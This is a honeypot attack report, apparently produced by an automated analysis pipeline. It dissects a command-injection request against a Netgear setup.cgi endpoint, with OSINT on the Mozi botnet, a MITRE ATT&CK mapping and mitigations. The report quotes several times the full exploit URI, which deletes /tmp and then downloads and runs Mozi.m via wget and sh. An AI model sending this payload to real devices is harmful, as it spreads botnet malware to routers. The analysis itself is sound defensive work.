# Attack Summary Report

## Attack Overview

A Linux honeypot system was targeted by a sophisticated attack originating from the IP address 178.72.69.244. The attack involved a carefully crafted HTTP request aiming to exploit vulnerabilities in the web application, particularly through a `setup.cgi` script. This attempt was characterized by command injection within the request parameters to execute arbitrary commands on the target system.

## Attack Details

- **Source IP**: 178.72.69.244
- **Destination IP (Honeypot)**: 172.31.5.68
- **Vulnerable Component**: Web application (`setup.cgi`)
- **HTTP Request**:
    - Method: GET
    - URI: `/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1`

## Attack Methods

1. **Command Injection**: The attacker utilized the HTTP GET request to inject a sequence of shell commands.
2. **Malware Download and Execution**:
    - **Clear Temporary Directory**: `rm -rf /tmp/*`
    - **Malware Retrieval**: `wget http://192.168.1.1:8088/Mozi.m -O /tmp/netgear`
    - **Script Execution**: `sh /tmp/netgear`

## Attack Goals

1. **System Compromise**: To exploit a web application vulnerability, allowing the attacker to execute arbitrary commands on the target system.
2. **Malware Deployment**: To download and execute a potentially malicious file (`Mozi.m`), likely intended to further compromise the system or integrate it into a botnet.
3. **Establishing Control & Further Malicious Activities**: Success in executing the payload could lead to the establishment of a command and control channel, enabling the attacker to perform additional malicious activities such as data exfiltration, lateral movement, or utilizing the compromised system as part of a botnet for DDoS attacks.

## Protection Strategies

- Regular system and application patches to address known vulnerabilities.
- Implementation of firewalls and intrusion detection/prevention systems to monitor and block suspicious activities.
- Secure application development practices to minimize vulnerabilities in web applications.
- Continuous monitoring for indicators of compromise to detect and respond to potential threats rapidly.

By understanding this attack's vectors, methods, and potential goals, an organization can reinforce its defenses, refine its detection capabilities, and prepare more effective response strategies against similar future threats.

# HTTP Sessions Analysis

The HTTP session involved in the attack requested the following URI and headers:

- **Method**: GET
- **URI**: `/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1`
- **HTTP Version**: HTTP/1.0

This request is designed to execute a series of commands via the query parameters. Here's a breakdown of the command sequence:
1. `rm -rf /tmp/*`: Deletes everything in the `/tmp` directory.
2. `wget http://192.168.1.1:8088/Mozi.m -O /tmp/netgear`: Downloads a file named `Mozi.m` from `http://192.168.1.1:8088` and saves it as `/tmp/netgear`.
3. `sh netgear`: Executes the downloaded script.

This sequence suggests that the attacker was attempting to first clean the target's temp directory, then download and execute a malicious script named `Mozi.m`.

The HTTP request observed in the attack against the Linux honeypot is a meticulously crafted command designed to exploit a vulnerability, execute unauthorized commands on the victim server, and possibly download and execute malicious scripts. Here's an analysis:

### HTTP Request Breakdown:
- **Request Type**: GET
- **URI**: `/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1`

#### Components of the Payload:
1. **Targeted Script**: `setup.cgi`
    - This indicates the specific script or endpoint on the server that the attacker is targeting. The use of a common script like 'setup.cgi', often found on network devices or systems with web interfaces, suggests this attack may be tailored to exploit vulnerabilities present in software associated with this endpoint.

2. **Query Parameters**:
    - `next_file=netgear.cfg` & `curpath=/` & `currentsetting.htm=1`: These parameters might be attempting to masquerade the request as a legitimate one for configuration purposes, or they could be used to exploit specific logic flaws in how the `setup.cgi` script processes these inputs.
    - `todo=syscmd`: Indicates an attempt to execute a system command, possibly exploiting a feature or bug in the script that allows for command execution.
    - `cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear`: The payload for the attack, broken down as follows:
        1. **Clear Temporary Directory** (`rm -rf /tmp/*`): Removes all files within the `/tmp` directory of the Linux system, potentially to ensure space or remove evidence of previous activities.
        2. **Download Malware** (`wget http://192.168.1.1:8088/Mozi.m -O /tmp/netgear`): Utilizes `wget` to download a file named `Mozi.m` from the specified address, saving it as `/tmp/netgear`. This step is concerning, as it indicates the attacker is attempting to download an external script or executable, likely malicious, onto the target system.
        3. **Execute Downloaded File** (`sh /tmp/netgear`): Runs the previously downloaded file, which could be a script or binary, presumably to achieve the attacker’s intended actions (e.g., installing a backdoor, executing a payload, joining a botnet).

#### Attack Intent:
Based on the composition of the request, the attacker's goals seem to include:
- **Initial Reconnaissance & Cleanup**: By deleting the contents of `/tmp`, the attacker may be preparing the environment for further activities without interference from existing files.
- **Malware Deployment**: The use of `wget` to download a file named `Mozi.m` suggests the intent to deploy malware on the compromised system. Given the name, it might be related to the Mozi botnet, known for compromising IoT devices and routers.
- **Execution and Compromise**: Running the downloaded script or binary (`sh /tmp/netgear`) signifies the final step in achieving execution, likely leading to the system's compromise.

#### Conclusion:
The HTTP request is a clear indication of an exploit attempt, leveraging a potential vulnerability in `setup.cgi` to execute a series of commands designed for malicious purposes. The attacker aims to first clear a space, then download and execute a potentially malicious script, suggesting an intent to gain unauthorized access, compromise the system, and possibly incorporate it into a botnet or perform other malicious activities.

# Malware OSINT

Given the available information and previous queries, we can draw several conclusions regarding the context and specifics of the attack, despite the absence of direct hits in major OSINT databases like MalwareBazaar, ThreatFox, URLhaus, and Malpedia for the specifically mentioned URL (`http://192.168.1.1:8088/Mozi.m`). The conclusions are based on the analysis of the source IP address, the nature of the HTTP request, and known patterns of malware behavior, especially regarding the Mozi botnet.

### Source IP Address: 178.72.69.244
- The source IP originates from Russia, associated with MTS PJSC, and has been flagged for malicious activities, including scanning and crypto mining threats.
- It has been involved in recent activity, suggesting an ongoing threat presence.

### HTTP Request Analysis:
- The HTTP request attempts to exploit a vulnerability allowing for the execution of arbitrary system commands (`cmd` parameter in the request URI).
- The commands intended to (1) clear the `/tmp` directory, (2) download a file named `Mozi.m` from a suspicious URL, and (3) execute the downloaded file, all indicate a clear attempt to infect the system with malware.
- The specific URL used (`http://192.168.1.1:8088/Mozi.m`) suggests the malware involved might be related to the Mozi botnet, despite the lack of direct database entries for this URL. The usage of a private IP address in the URL could indicate an internal network attack scenario or a misconfiguration in the attacker's setup.

### Mozi Botnet Context:
- **Malpedia**: Although the specific file `Mozi.m` hasn't been matched in queries, the Mozi botnet is known to compile a peer-to-peer botnet primarily targeting IoT devices. It spreads by exploiting vulnerabilities and weak passwords to achieve execution on vulnerable devices.
- **General Behavior**: Mozi uses the infected devices for multiple malicious activities, including DDoS attacks, data exfiltration, and payload delivery for further infections.

### Absence of Direct Hits in OSINT Databases:
- The absence of hits in MalwareBazaar, ThreatFox, and URLhaus regarding the precise file or URL may not detract from the potential threat posed by `Mozi.m`. It is common for variants or newly deployed instances of known malware like Mozi to temporarily evade listing in such databases.
- Continuous updates and variations in malware strains make it challenging to ensure every single instance or related URL is immediately cataloged by OSINT tools.

### Conclusions:
- The observed attack vector is indicative of an attempt to exploit vulnerabilities for the purpose of malware infection, with strong indications towards the Mozi botnet due to the naming convention and behavior outlined in the request.
- Continuous monitoring, reporting, and analysis efforts contribute to the eventual capture and cataloging of new malware variants, URLs, and IP addresses associated with malicious activities.
- Given the behavior of the attack, it is advisable for administrators and cybersecurity personnel to ensure systems are patched against known vulnerabilities, default credentials are changed, and network traffic is monitored for unusual patterns that may indicate a compromise attempt.

# Which vulnerability does the attack attempt to exploit?

The provided exploit details highlight a critical security vulnerability that was exploited in the described attack, showcasing the potential for unauthenticated attackers to execute arbitrary commands on vulnerable devices. This exploit underscores the importance of firmware updates and the necessity of implementing security measures to protect network devices from unauthorized access and command execution.


# MITRE ATT&CK
The tactics and techniques observed in the attack on the Linux honeypot can be mapped to specific categorizations within the MITRE ATT&CK framework. The attack demonstrates a sequence involving initial access, execution, and potentially command and control. Here's how the observed behaviors fit within the framework:

### Initial Access
- **Exploit Public-Facing Application (T1190)**: The attacker attempts to exploit vulnerabilities in web applications (e.g., `setup.cgi` script) accessible from the internet to execute unauthorized commands. This aligns with attempts to gain initial entry into a system or network through publicly accessible applications.

### Execution
- **Command and Scripting Interpreter: Unix Shell (T1059.004)**: The use of shell commands (`rm`, `wget`, `sh`) in the HTTP request to manipulate files and execute a downloaded script indicates the adversary's utilization of existing scripting capabilities within the system to execute their objectives.

### Persistence
- Although not directly observed in the provided data, if the file `Mozi.m` downloaded and executed as part of the attack was intended for the long-term establishment (e.g., installing a backdoor or botnet software), it can be categorized under:
  - **Create or Modify System Process (T1543)**: If the malware installs itself as a system service or process for persistence.

### Defense Evasion
- **Obfuscated Files or Information (T1027)**: The attack might employ obfuscation by utilizing a seemingly benign URL and parameters in the HTTP request to mask the intent of downloading and executing malicious scripts.
  
### Command and Control
- If the downloaded file (`Mozi.m`) served to establish communication with the attacker-controlled server for further commands or data exfiltration, it could fall under:
  - **Application Layer Protocol (T1071)**: Utilizing standard application layer protocols to facilitate command and control communications.

### Impact
- **Resource Hijacking (T1496)**: If the eventual goal of `Mozi.m` and similar malware is to co-opt the infected system into a botnet for DDoS attacks or cryptocurrency mining, it would classify under this tactic.

### Conclusion
The observed attack vector encompasses multiple stages of the cyber attack lifecycle, primarily focusing on exploiting a public-facing application to execute unauthorized commands. If the end goal was to install persistent malware, it could also involve persistence and command and control dynamics. However, the specific impact and further intentions (such as data theft, resource hijacking, or lateral movement within the network) largely depend on the nature and capabilities of `Mozi.m`, the file purported to be downloaded and executed in the attack.

# What Is The Goal Of The Attack?
Based on the analysis of the command executed in the HTTP request during the attack on the Linux honeypot, the attack appears to have a multi-staged goal involving both immediate and potential long-term objectives. The breakdown of the executed command points towards the following primary goals:

### Immediate Goal

1. **Compromise System Integrity**: By exploiting a vulnerability in the web application (e.g., through `setup.cgi`), the attacker aims to execute arbitrary commands on the target system. This immediate goal compromises the system's integrity, opening the door for further malicious activities.

2. **Malware Installation and Execution**: The specific commands within the HTTP request aim to delete the contents of the `/tmp` directory, download a file (presumably malicious) named `Mozi.m` from a provided URL (`http://192.168.1.1:8088/Mozi.m`), and execute it. This indicates the goal of installing and executing malware on the compromised system.

### Potential Long-Term Goals

1. **Establishment of Command and Control (C2) Communication**: The malware referred to as `Mozi.m` could be designed to establish C2 communication between the compromised system and an attacker-controlled server. This allows the attacker to maintain persistent access, command execution, and potentially direct the compromised system to perform specific tasks under the command of the attacker.

2. **Inclusion in a Botnet**: Given the mention of `Mozi.m`, which hints at the Mozi botnet known for targeting IoT devices and routers, a probable long-term goal is to add the compromised system to a botnet. This can be used for Distributed Denial of Service (DDoS) attacks, additional malware distribution, or cryptocurrency mining, among other malicious activities.

3. **Resource Hijacking**: If the compromised system's resources (e.g., computing power, network bandwidth) are utilized for purposes like cryptocurrency mining or launching DDoS attacks as part of the botnet, it signifies resource hijacking as a goal.

4. **Lateral Movement and Further Compromise**: Depending on the capabilities of the installed malware, the attacker might aim to move laterally within the network, compromising additional systems or escalating their privileges for more significant impact.

### Conclusion

The goal of the attack encompasses both the immediate compromise and control of the target system through malware installation and execution, and potentially broader objectives such as integrating the compromised system into a botnet, conducting further malicious activities, and possibly escalating the attack within the compromised network. These goals highlight the attacker's intent to not only gain unauthorized access but also to leverage the compromised system for further malicious purposes.

# If The System Is Vulnerable, Would The Attack Will Be Successful?
If the system is vulnerable to the described exploit—specifically, unauthenticated command execution on Netgear DGN devices through `setup.cgi` with firmware versions earlier than fixed releases—then the attack would likely be successful. The success of this attack hinges on several key factors:

### Factors Determining Attack Success:

1. **Vulnerability Presence**: The system must be running a vulnerable firmware version of the affected products (e.g., Netgear DGN1000 with firmware version < 1.1.00.48 or Netgear DGN2200 v1). If the system has been updated to a non-vulnerable version, the attack would not be successful.

2. **Correct Execution of the Exploit**: The attacker's ability to correctly formulate and send the HTTP request exploiting this vulnerability is crucial. The provided attack vector explicitly shows the attacker's knowledge about the exploit and how to leverage it to execute arbitrary commands.

3. **Lack of Protective Measures**: Absence of security controls that could prevent or detect the exploitation attempt, such as Web Application Firewalls (WAF), Intrusion Detection Systems (IDS), or security configurations that restrict or monitor outbound connections and command executions.

4. **System Configuration and Architecture**: Certain system configurations or network architectures might prevent the exploit from working as intended, even if the software is vulnerable. For instance, network configurations that block access to `setup.cgi` from an external network would hinder this attack.

5. **Existence of Secondary Defenses**: Systems with robust security measures in place, like strict access controls, effective logging and monitoring, and regular security updates, might limit the impact even if the initial exploit succeeds.

### Conclusion:

Assuming the targeted system is vulnerable (not patched against the specific vulnerability) and lacks effective security measures to detect or mitigate the exploitation, the attack described has a high likelihood of being successful. It would allow the attacker to execute arbitrary commands with potentially high privileges on the system.

Therefore, to protect against such attacks, it's crucial to ensure that systems are regularly updated to the latest firmware versions addressing known vulnerabilities, alongside implementing comprehensive security measures that can prevent, detect, and respond to attempted exploits.
